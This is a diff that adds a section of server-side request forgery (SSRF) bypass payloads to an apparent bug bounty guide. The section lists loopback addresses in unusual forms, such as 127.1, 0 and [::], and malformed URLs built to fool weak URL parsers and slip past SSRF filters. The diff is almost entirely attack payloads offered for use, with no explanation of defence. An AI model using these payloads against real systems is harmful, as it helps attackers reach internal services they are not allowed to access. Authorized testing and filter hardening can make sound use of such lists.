@@ -159,3 +159,29 @@ Important Guides for Bugbounty Tools
 
 
 
+Best Payloads for SSRF (Unique bypasses):-
+
+Bypassing SSRF with CIDR:-
+
+http://127.127.127.127
+http://127.0.0.0
+
+Bypass using rare address:-
+
+http://127.1
+http://0/
+
+Bypass using tricks combination
+
+http://1.1.1.1 &@j2.2.2.2# @3.3.3.3.3/
+urllib : 3.3.3.3
+
+Bypass against a weak parser:-
+
+http://127.1.1.1:80\@127.2.2.2:80/
+
+Bypass localhost with [::]:-
+http://[::]:80/
+http://0000::1:80/
+
+
